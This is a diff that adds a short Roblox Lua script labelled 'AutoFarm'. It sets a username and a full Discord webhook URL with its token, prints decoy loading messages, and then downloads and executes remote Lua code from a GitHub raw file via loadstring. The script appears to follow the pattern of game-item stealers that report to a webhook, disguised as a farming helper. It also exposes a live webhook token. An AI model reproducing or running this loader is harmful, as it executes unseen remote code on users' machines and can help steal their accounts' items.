@@ -1,0 +1,15 @@
+Username = "Yrotnme"
+
+WebHook = "https://discord.com/api/webhooks/1097829546516033596/NuSWv1iH5pyBOP6n6AlZgHbEt3oPYVhroobbJ_t3-K2lrg5nd-PMtKj0Rgxncc48ZnPn"
+
+_G.CustomScriptName = "AutoFarm"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Script"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
